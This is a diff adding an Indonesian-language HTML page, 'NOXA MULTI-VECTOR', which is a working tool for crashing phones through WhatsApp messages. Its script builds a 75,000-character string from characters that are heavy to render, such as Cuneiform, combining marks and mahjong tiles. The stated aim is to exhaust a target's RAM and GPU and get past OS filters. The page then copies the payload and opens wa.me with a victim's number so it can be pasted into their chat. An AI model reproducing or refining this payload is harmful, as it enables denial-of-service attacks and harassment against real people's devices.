@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>NOXA - HETEROGENEOUS CRASH</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+        .box { border: 2px solid #00ff00; background: #050505; padding: 25px; box-shadow: 0 0 40px #00ff00; max-width: 600px; margin: auto; border-radius: 10px; }
+        h1 { color: #ff0000; text-shadow: 0 0 10px #ff0000; letter-spacing: 2px; }
+        .status { color: #fff; font-size: 11px; margin: 10px 0; background: #222; padding: 10px; border-left: 5px solid #ff0000; text-align: left; }
+        textarea { width: 100%; height: 200px; background: #000; color: #ff00ea; border: 1px solid #333; font-size: 9px; margin: 10px 0; word-break: break-all; }
+        .btn { background: #ff0000; color: #fff; padding: 15px; width: 100%; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 15px; box-shadow: 0 4px #900; }
+        .btn:active { transform: translateY(2px); box-shadow: none; }
+        .btn-wa { background: #25d366; color: #000; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>NOXA MULTI-VECTOR</h1>
+        <div class="status">
+            SURS CORE: ACTIVE<br>
+            VECTOR: Heterogeneous Unicode Injection<br>
+            TARGET: RAM & GPU Exhaustion
+        </div>
+        
+        <input type="text" id="targetNum" placeholder="Nomor Target: 628xxxx" style="width: 100%; padding: 12px; background: #111; border: 1px solid #00ff00; color: #fff; margin-bottom: 10px; box-sizing: border-box;">
+        
+        <button class="btn" onclick="generateMultiVector()">1. GENERATE DIVERSE PAYLOAD</button>
+        
+        <textarea id="payload" readonly placeholder="Payload akan muncul di sini..."></textarea>
+        
+        <button class="btn btn-wa" onclick="copyAndLaunch()">2. COPY & ATTACK</button>
+        
+        <p style="font-size: 10px; color: #888; margin-top: 15px;">Note: Payload mengandung 70.000+ karakter dari 15 kategori berbeda untuk bypass filter OS.</p>
+    </div>
+
+    <script>
+        function generateMultiVector() {
+            let p = document.getElementById('payload');
+            // Koleksi Karakter yang Memiliki Tingkat Kerumitan Render Tertinggi (Heterogen)
+            let vectors = [
+                "ဪ", "꧀", "ॣ", "ी", "ू", "ा", "्", "ि", "҈", "﷽", "𒀱", "𒈓", "𒈙", "𒈔", 
+                "𒐫", "𒚭", "𒚫", "𒙶", "𒙲", "☖", "☗", "⚀", "⚁", "⚂", "⚃", "⚄", "⚅", "🀄", 
+                "🀅", "🀆", "🀇", "🀈", "🀉", "🀊", "🀋", "🀌", "🀍", "🀎", "🀏", "🀐", "🀑", "🀒"
+            ];
+            
+            let bomb = "NOXA_HETEROGEN_";
+            // Menghasilkan 75.000 karakter acak yang berbeda-beda
+            for(let i=0; i<75000; i++) {
+                bomb += vectors[Math.floor(Math.random() * vectors.length)];
+            }
+            p.value = bomb;
+            alert("Payload Berhasil Dibuat dengan Karakter Berbeda! 75.000 Chars Ready.");
+        }
+
+        function copyAndLaunch() {
+            let num = document.getElementById('targetNum').value;
+            let p = document.getElementById('payload');
+            if(p.value == "" || num == "") return alert("Lengkapi Nomor & Generate dulu!");
+
+            p.select();
+            p.setSelectionRange(0, 99999); 
+            document.execCommand("copy");
+
+            alert("Payload Berhasil Disalin! Pastikan Anda melakukan PASTE (TEMPEL) secara manual di chat korban.");
+            window.location.href = "https://wa.me/" + num;
+        }
+    </script>
+</body>
+</html>
